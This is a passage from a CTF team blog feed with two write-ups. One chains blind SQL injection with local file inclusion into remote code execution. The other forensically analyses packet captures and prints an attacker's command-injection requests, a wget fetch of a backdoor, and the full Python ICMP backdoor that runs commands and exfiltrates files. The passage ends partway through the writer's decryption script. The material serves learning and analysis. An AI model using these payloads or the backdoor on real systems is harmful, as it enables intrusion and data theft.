<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">$ sqlmap -u "http://tasks.ctf.com.ua:13372/index.php?country=USA" <span class="comment">--tables --threads=10 --exclude-sysdbs --dump</span></div><div class="line"><span class="comment">---</span></div><div class="line">Parameter: country (GET)</div><div class="line">    Type: boolean-based blind</div><div class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</div><div class="line">    Payload: country=USA' AND 6412=6412 AND 'lvwC'='lvwC</div><div class="line"></div><div class="line">    Type: AND/OR time-based blind</div><div class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</div><div class="line">    Payload: country=USA' AND SLEEP(5) AND 'buJa'='buJa</div><div class="line"><span class="comment">---</span></div><div class="line">[16:51:04] [INFO] the back-<span class="keyword">end</span> DBMS <span class="keyword">is</span> MySQL</div><div class="line">web <span class="keyword">server</span> operating <span class="keyword">system</span>: Linux Ubuntu</div><div class="line">web application technology: Apache <span class="number">2.4</span><span class="number">.7</span>, PHP <span class="number">5.5</span><span class="number">.9</span></div><div class="line">back-<span class="keyword">end</span> DBMS: MySQL &gt;= <span class="number">5.0</span><span class="number">.12</span></div><div class="line"><span class="keyword">Database</span>: WHATAREYOUDOINGHERE</div><div class="line">[<span class="number">1</span> <span class="keyword">table</span>]</div><div class="line">+<span class="comment">-----------+</span></div><div class="line">| countries |</div><div class="line">+<span class="comment">-----------+</span></div><div class="line"><span class="keyword">Database</span>: WHATAREYOUDOINGHERE</div><div class="line"><span class="keyword">Table</span>: countries</div><div class="line">[<span class="number">10</span> entries]</div><div class="line">+<span class="comment">-----------+----------------+--------------+</span></div><div class="line">| countryID | scriptPath     | countryName  |</div><div class="line">+<span class="comment">-----------+----------------+--------------+</span></div><div class="line">| <span class="number">1</span>         | country/ge.php | Germany      |</div><div class="line">| <span class="number">2</span>         | country/tu.php | Turkmenistan |</div><div class="line">| <span class="number">3</span>         | country/ne.php | Netherlands  |</div><div class="line">| <span class="number">4</span>         | country/se.php | Serbia       |</div><div class="line">| <span class="number">5</span>         | country/tk.php | Turkey       |</div><div class="line">| <span class="number">6</span>         | country/fr.php | France       |</div><div class="line">| <span class="number">7</span>         | country/uk.php | UK           |</div><div class="line">| <span class="number">8</span>         | country/ru.php | Russia       |</div><div class="line">| <span class="number">9</span>         | country/us.php | USA          |</div><div class="line">| <span class="number">10</span>        | country/ca.php | Canada       |</div><div class="line">+<span class="comment">-----------+----------------+--------------+</span></div></pre></td></tr></table></figure>
<p> And we got an Blind sql injection dump (Thanks you sqlmap for doing the boring part for us!), but after dumping the database we didn’t find anything special, but if we start thinking how the page is actually working behind this, we can see the admin is selecting the path to a country php file which contains the upload form and INCLUDES it on the index.php page!!!! and here is the key for this challenge! We can try to combine SQLi and LFI with a union technique injection!  </p>
<ol>
<li>Getting the column number:</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># successfully shows up a upload form!</span></div><div class="line">$ curl <span class="string">'http://tasks.ctf.com.ua:13372/index.php?country=Germany\'</span> order by 1-- qqq<span class="string">'</span></div><div class="line"><span class="string"># Doest show a upload form!</span></div><div class="line"><span class="string">$ curl '</span>http://tasks.ctf.com.ua:13372/index.php?country=Germany\<span class="string">' order by 2-- qqq'</span></div></pre></td></tr></table></figure>
<ol>
<li><p>Performing union injection and include /etc/passwd:</p>
<p> <img src="https://i.imgur.com/JFXjJx1.png" alt="LFI AND SQLi"></p>
</li>
<li><p>Including our previous uploaded php script and and get remote code execution on the server!</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">"http://tasks.ctf.com.ua:13372/index.php?cmd=ls -lta&amp;country=German' union all select 'uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php' -- frhQ"</span></div><div class="line"><span class="string">"truncated html code"</span></div><div class="line">total 72</div><div class="line">drwxrwxrwx 2 1002 1002 40960 Aug 27 21:16 uploads</div><div class="line">-r--r--r-- 1 1002 1002    49 Aug 27 07:36 .htaccess</div><div class="line">drwxrwxr-x 5 1002 1002  4096 Aug 25 20:26 .</div><div class="line">-r--r--r-- 1 1002 1002    44 Aug 25 20:26 iulersiueruigfuihseruhgi.php</div><div class="line">drwxrwxr-x 4 1002 1002  4096 Aug 25 13:59 ..</div><div class="line">-r--r--r-- 1 1002 1002  1667 Jul 28 20:54 index.php</div><div class="line">drwxrwxr-x 2 1002 1002  4096 Jul 28 03:35 country</div><div class="line">drwxrwxr-x 2 1002 1002  4096 Jul 28 03:34 static</div><div class="line"><span class="string">"truncated html code"</span></div></pre></td></tr></table></figure>
<p>The flag was in the php file iulersiueruigfuihseruhgi.php:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ curl <span class="string">'http://tasks.ctf.com.ua:13372/index.php?cmd=cat%20iulersiueruigfuihseruhgi.php&amp;country=German%27%20union%20all%20select%20%27uploads/dnjefwh43jfh342fnewjfjndewefnu27fd.php%27%20--%20frhQ'</span></div><div class="line"><span class="string">"truncated html code"</span></div><div class="line">&lt;pre&gt;</div><div class="line">&lt;?php</div><div class="line"><span class="variable">$flag</span>=<span class="string">"h4ck1t&#123;<span class="variable">$QL</span>&amp;LFI=FR13ND$&#125;"</span>;</div><div class="line">?&gt;</div><div class="line">&lt;/pre&gt;</div><div class="line"><span class="string">"truncated html code"</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;V1rus3pidem1c&lt;br&gt;web100&lt;br&gt;&lt;br&gt;Wasted&lt;br&gt;&lt;br&gt;16&lt;br&gt;&lt;br&gt;Description: Hackers created an automated site for virus attacks on t
    
    </summary>
    
      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
    
    
      <category term="lfi" scheme="https://teamrocketist.github.io/tags/lfi/"/>
    
      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
    
      <category term="blindsqli" scheme="https://teamrocketist.github.io/tags/blindsqli/"/>
    
  </entry>
  
  <entry>
    <title>[Network] Sha2017 - Abuse Mail [300]</title>
    <link href="https://teamrocketist.github.io/2017/08/07/Network-Sha2017-Abuse-Mail-300/"/>
    <id>https://teamrocketist.github.io/2017/08/07/Network-Sha2017-Abuse-Mail-300/</id>
    <published>2017-08-07T12:52:21.000Z</published>
    <updated>2017-08-10T02:49:22.370Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br><br>Abuse Mail (300) - 62 solves<br>Our abuse desk received an mail that someone from our network has hacked their company. With their help we found some suspected traffic in our network logs, but we can’t find what exactly has happened. Can you help us to catch the culprit?<br><br><a href="https://ctf.sha2017.org/download?file_key=ad9dfb334a977140e0d9acb77def441e2d38f8fe97a04eeae1c1e2df249c2a09&team_key=e3d856e04ca181b6335a385d5f82cc2240f10195d682907cb54893fde801b87b" target="_blank" rel="external">abusemail.tgz</a><br><br>233b7cb7f8113baca2f8d29d74105887<br><br></blockquote>

<p>we have 3 capture files abuse00.pcap, abuse01.pcap and abuse02.pcap. Starting with abuse00.pcap we can see we have some encrypted ESP packages and some telenet communication. Let’s check telenet’s packages:<br><img alt="Telnet Packages" src="https://i.imgur.com/VAv3kd4.png" title="Telnet Packages"></p>
<p>Now we have the credentials to decrypt the ESP packages! using wireshark to decrypt them Edit -&gt; Preferences -&gt; Protocols -&gt; ESP</p>
<p><img src="https://i.imgur.com/R2dfoNH.png" title="Decrypt ESP"></p>
<p>After decrypting it we can see that the hacker used a remote command vulnerability at the GET parameter IP to  upload a backdoor on the server. the commands he used:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">GET /?ip=google.com HTTP/1.1</div><div class="line">PING google.com (172.217.17.110) 56(84) bytes of data.</div><div class="line">64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=9.12 ms</div><div class="line">64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=8.86 ms</div><div class="line">64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.3 ms</div><div class="line">64 bytes from ams15s29-in-f110.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.06 ms</div><div class="line"></div><div class="line">GET /?ip=google.com;ls HTTP/1.1</div><div class="line">ING google.com (172.217.17.110) 56(84) bytes of data.</div><div class="line">64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=1 ttl=55 time=8.66 ms</div><div class="line">64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=2 ttl=55 time=9.44 ms</div><div class="line">64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=3 ttl=55 time=10.0 ms</div><div class="line">64 bytes from ams15s29-in-f14.1e100.net (172.217.17.110): icmp_seq=4 ttl=55 time=8.44 ms</div><div class="line"></div><div class="line">--- google.com ping statistics ---</div><div class="line">4 packets transmitted, 4 received, 0% packet loss, time 3005ms</div><div class="line">rtt min/avg/max/mdev = 8.445/9.153/10.057/0.639 ms</div><div class="line">css</div><div class="line">index.php</div><div class="line"></div><div class="line">GET /?ip=;ls%20-la HTTP/1.1</div><div class="line">total 16</div><div class="line">drwxr-xr-x 3 root     root     4096 Jul 26 09:36 .</div><div class="line">drwxr-xr-x 3 root     root     4096 Jul 26 03:45 ..</div><div class="line">drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css</div><div class="line">-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.php</div><div class="line"></div><div class="line"></div><div class="line">GET /?ip=;sudo%20<span class="_">-l</span> HTTP/1.1</div><div class="line">Matching Defaults entries <span class="keyword">for</span> www-data on router:</div><div class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</div><div class="line"></div><div class="line">User www-data may run the following commands on router:</div><div class="line">    (ALL : ALL) NOPASSWD: ALL</div><div class="line"></div><div class="line"></div><div class="line">GET /?ip=;id HTTP/1.1</div><div class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</div><div class="line"></div><div class="line">GET /?ip=;wget http://10.5.5.207/backdoor.py -O /tmp/backdoor.py HTTP/1.1</div><div class="line">--2017-07-26 09:43:36--  http://10.5.5.207/backdoor.py</div><div class="line">Connecting to 10.5.5.207:80... connected.</div><div class="line">HTTP request sent, awaiting response... 200 OK</div><div class="line">Length: 2428 (2.4K) [text/x-python]</div><div class="line">Saving to: <span class="string">'/tmp/backdoor.py'</span></div><div class="line">0K ..                                                    100%  458M=0s</div><div class="line"></div><div class="line">2017-07-26 09:43:36 (458 MB/s) - <span class="string">'/tmp/backdoor.py'</span> saved [2428/2428]</div><div class="line">GET /?ip=;cat /tmp/backdoor.py HTTP/1.1</div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line">import base64</div><div class="line">import sys</div><div class="line">import time</div><div class="line">import subprocess</div><div class="line">import threading</div><div class="line"></div><div class="line">from Crypto import Random</div><div class="line">from Crypto.Cipher import AES</div><div class="line">from scapy.all import *</div><div class="line"></div><div class="line">BS = 16</div><div class="line">pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</div><div class="line">unpad = lambda s : s[0:-ord(s[-1])]</div><div class="line">magic = <span class="string">"SHA2017"</span></div><div class="line"></div><div class="line"></div><div class="line">class AESCipher:</div><div class="line"></div><div class="line">    def __init__( self, key ):</div><div class="line">        self.key = key</div><div class="line"></div><div class="line">    def encrypt( self, raw ):</div><div class="line">        raw = pad(raw)</div><div class="line">        iv = Random.new().<span class="built_in">read</span>( AES.block_size )</div><div class="line">        cipher = AES.new( self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="built_in">return</span> base64.b64encode( iv + cipher.encrypt( raw ) )</div><div class="line"></div><div class="line">    def decrypt( self, enc ):</div><div class="line">        enc = base64.b64decode(enc)</div><div class="line">        iv = enc[:16]</div><div class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="built_in">return</span> unpad(cipher.decrypt( enc[16:] ))</div><div class="line"></div><div class="line">def run_command(cmd):</div><div class="line">    ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</div><div class="line">    output = ps.communicate()[0]</div><div class="line">    <span class="built_in">return</span> output</div><div class="line"></div><div class="line">def send_ping(host, magic, data):</div><div class="line">    data = cipher.encrypt(data)</div><div class="line">    load = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(magic, data)</div><div class="line">    time.sleep(1)</div><div class="line">    sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)</div><div class="line"></div><div class="line">def chunks(L, n):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(0, len(L), n):</div><div class="line">        yield L[i:i+n]</div><div class="line"></div><div class="line">def get_file(host, magic, fn):</div><div class="line">    time.sleep(1)</div><div class="line">    data = base64.urlsafe_b64encode(open(fn, <span class="string">"rb"</span>).<span class="built_in">read</span>())</div><div class="line">    cnt = 0</div><div class="line">    icmp_threads = []</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> chunks(data, 500):</div><div class="line">        t = threading.Thread(target = send_ping, args = (host,magic, <span class="string">"getfile:&#123;&#125;:&#123;&#125;"</span>.format(cnt,line)))</div><div class="line">        t.daemon = True</div><div class="line">        t.start()</div><div class="line">        icmp_threads.append(t)</div><div class="line">        cnt += 1</div><div class="line"></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> icmp_threads:</div><div class="line">        t.join()</div><div class="line"></div><div class="line"></div><div class="line">cipher = AESCipher(sys.argv[1])</div><div class="line"></div><div class="line"><span class="keyword">while</span> True:</div><div class="line">    try: </div><div class="line">        pkts = sniff(filter=<span class="string">"icmp"</span>, timeout =5,count=1)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> packet <span class="keyword">in</span> pkts:</div><div class="line">             <span class="keyword">if</span>  str(packet.getlayer(ICMP).<span class="built_in">type</span>) == <span class="string">"8"</span>: </div><div class="line">                input = packet[IP].load</div><div class="line">                <span class="keyword">if</span> input[0:len(magic)] == magic:</div><div class="line">                    input = input.split(<span class="string">":"</span>)</div><div class="line">                    data = cipher.decrypt(input[1]).split(<span class="string">":"</span>)</div><div class="line">                    ip = packet[IP].src</div><div class="line">                    <span class="keyword">if</span> data[0] == <span class="string">"command"</span>:</div><div class="line">                        output = run_command(data[1])</div><div class="line">                        send_ping(ip, magic, <span class="string">"command:&#123;&#125;"</span>.format(output))</div><div class="line">                    <span class="keyword">if</span> data[0] == <span class="string">"getfile"</span>:</div><div class="line">                        <span class="comment">#print "[+] Sending file &#123;&#125;".format(data[1])</span></div><div class="line">                        get_file(ip, magic, data[1])</div><div class="line">    except:</div><div class="line">        pass</div><div class="line"></div><div class="line">GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb &amp; HTTP/1.1</div></pre></td></tr></table></figure>
<p>The hacker used AES to encrypt his commands! And we know the password he used! which we can get it from the GET HTTP request! which was K8djhaIU8H2d1jNb “GET /?ip=;nohup sudo python /tmp/backdoor.py K8djhaIU8H2d1jNb &amp; HTTP/1.1”.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</div><div class="line"></div><div class="line">BS = <span class="number">16</span></div><div class="line">pad = <span class="keyword">lambda</span> s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</div><div class="line">unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</div><div class="line">magic = <span class="string">"SHA2017"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">( self, key )</span>:</span></div><div class="line">        self.key = key</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">( self, raw )</span>:</span></div><div class="line">        raw = pad(raw)</div><div class="line">        iv = Random.new().read( AES.block_size )</div><div class="line">        cipher = AES.new( self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="keyword">return</span> base64.b64encode( iv + cipher.encrypt( raw ) )</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">( self, enc )</span>:</span></div><div class="line">        enc = base64.b64decode(enc)</div><div class="line">        iv = enc[:<span class="number">16</span>]</div><div class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv )</div><div class="line">        <span class="keyword">return</span> unpad(cipher.decrypt( enc[<span class="number">16</span>:] ))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(cmd)</span>:</span></div><div class="line">    ps = subprocess.Popen(cmd,shell=<span class="keyword">True</span>,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</div><div class="line">    output = ps.communicate()[<span class="number">0</span>]</div><div class="line">    <span class="keyword">return</span> output</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_ping</span><span class="params">(host, magic, data)</span>:</span></div><div class="line">    data = cipher.encrypt(data)</div><div class="line">    load = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(magic, data)</div><div class="line">    time.sleep(<span class="number">1</span>)</div><div class="line">    sr(IP(dst=host)/ICMP()/load, timeout=<span class="number">1</span>, verbose=<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span><span class="params">(L, n)</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(L), n):</div><div class="line">        <span class="keyword">yield</span> L[i:i+n]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file</span><span class="params">(host, magic, fn)</span>:</span></div><div class="line">    time.sleep(<span class="number">1</span>)</div><div class="line">    data = base64.urlsafe_b64encode(open(fn, <span class="string">"rb"</span>).read())</div><div class="line">    cnt = <span class="number">0</span></div><div class="line">    icmp_threads = []</div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> chunks(data, <span class="number">500</span>):</div><div class="line">        t = threading.Thread(target = send_ping, args = (host,magic, <span class="string">"getfile:&#123;&#125;:&#123;&#125;"</span>.format(cnt,line)))</div><div class="line">        t.daemon = <span class="keyword">True</span></div><div class="line">        t.start()</div><div class="line">        icmp_threads.append(t)</div><div class="line">        cnt += <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> icmp_threads:</div><div class="line">        t.join()</div><div class="line"></div><div class="line"></div><div class="line">cipher = AESCipher(sys.argv[<span class="number">1</span>])</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    <span class="keyword">try</span>: </div><div class="line">        pkts = sniff(filter=<span class="string">"icmp"</span>, timeout =<span class="number">5</span>,count=<span class="number">1</span>)</div><div class="line"></div><div class="line">        <span class="keyword">for</span> packet <span class="keyword">in</span> pkts:</div><div class="line">             <span class="keyword">if</span>  str(packet.getlayer(ICMP).type) == <span class="string">"8"</span>: </div><div class="line">                input = packet[IP].load</div><div class="line">                <span class="keyword">if</span> input[<span class="number">0</span>:len(magic)] == magic:</div><div class="line">                    input = input.split(<span class="string">":"</span>)</div><div class="line">                    data = cipher.decrypt(input[<span class="number">1</span>]).split(<span class="string">":"</span>)</div><div class="line">                    ip = packet[IP].src</div><div class="line">                    <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">"command"</span>:</div><div class="line">                        output = run_command(data[<span class="number">1</span>])</div><div class="line">                        send_ping(ip, magic, <span class="string">"command:&#123;&#125;"</span>.format(output))</div><div class="line">                    <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">"getfile"</span>:</div><div class="line">                        <span class="comment">#print "[+] Sending file &#123;&#125;".format(data[1])</span></div><div class="line">                        get_file(ip, magic, data[<span class="number">1</span>])</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p>With all this information we need to decrypt the packages from the other PCAPs, which contains the communication between the hacker and the server, we can use the hackers script and password! first lets extract the encrypted data with tshark!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r abuse02.pcap -Tfields -e data | xxd -r -p &gt; encrypted1</div><div class="line">kinyabitch@Debian ~/D/H/c/sha2017&gt; tshark -r abuse03.pcap -Tfields -e data | xxd -r -p &gt; encrypted2</div></pre></td></tr></table></figure>
<p>Now modifing the scrypt so we can decrypt our IMCP encrypted data:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">import base64</div><div class="line">import sys</div><div class="line">import time</div><div class="line">import subprocess</div><div class="line">import threading</div><div class="line"></div><div class="line">from Crypto import Random</div><div class="line">from Crypto.Cipher import AES</div><div class="line">import binascii</div><div class="line">import re</div><div class="line"></div><div class="line">BS = 16</div><div class="line">pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</div><div class="line">unpad = lambda s : s[0:-ord(s[-1])]</div><div class="line">magic = <span class="string">"SHA2017"</span></div><div class="line">key2=<span class="string">"K8djhaIU8H2d1jNb"</span></div><div class="line">stri=<span 